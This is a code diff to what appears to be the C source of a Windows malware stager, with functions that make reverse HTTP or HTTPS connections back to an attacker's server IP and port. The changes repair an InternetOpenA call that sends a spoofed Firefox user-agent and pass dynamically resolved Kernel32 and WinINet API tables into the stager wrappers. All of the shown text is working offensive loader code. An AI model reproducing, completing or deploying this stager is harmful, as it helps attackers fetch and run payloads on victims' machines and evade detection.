@@ -57,7 +57,7 @@ BOOL StagerReverseHttpOrHttps(Kernel32_API kernel32,Wininet_API wininet,WCHAR* S
 	const char HttpHeader[] = "Mozilla/5.0 (Windows N WOW64; rv:11.0) Gecko Firefox/11.0";
 	genURL(FullURL, urlLenght);
 
-	hInternetOpen = wininet.InternetOpenAFHttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternetOpen = wininet.InternetOpenAF(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternetOpen == NULL) {
 		DisplayError(L"InternetOpenA");
 		return FALSE;
@@ -112,9 +112,9 @@ BOOL StagerReverseHttpOrHttps(Kernel32_API kernel32,Wininet_API wininet,WCHAR* S
 	return FALSE;
 }
 
-BOOL StagerReverseHTTPS(WCHAR* ServeurIP, int Port) {
-	return StagerReverseHttpOrHttps(ServeurIP, Port, TRUE);
+BOOL StagerReverseHTTPS(Kernel32_API kernel32, Wininet_API wininet, WCHAR* ServeurIP, int Port) {
+	return StagerReverseHttpOrHttps( kernel32, wininet, ServeurIP, Port, TRUE);
 }
-BOOL StagerReverseHTTP(WCHAR* ServeurIP, int Port) {
-	return StagerReverseHttpOrHttps(ServeurIP, Port, FALSE);
+BOOL StagerReverseHTTP(Kernel32_API kernel32, Wininet_API wininet, WCHAR* ServeurIP, int Port) {
+	return StagerReverseHttpOrHttps(kernel32, wininet, ServeurIP, Port, FALSE);
 }
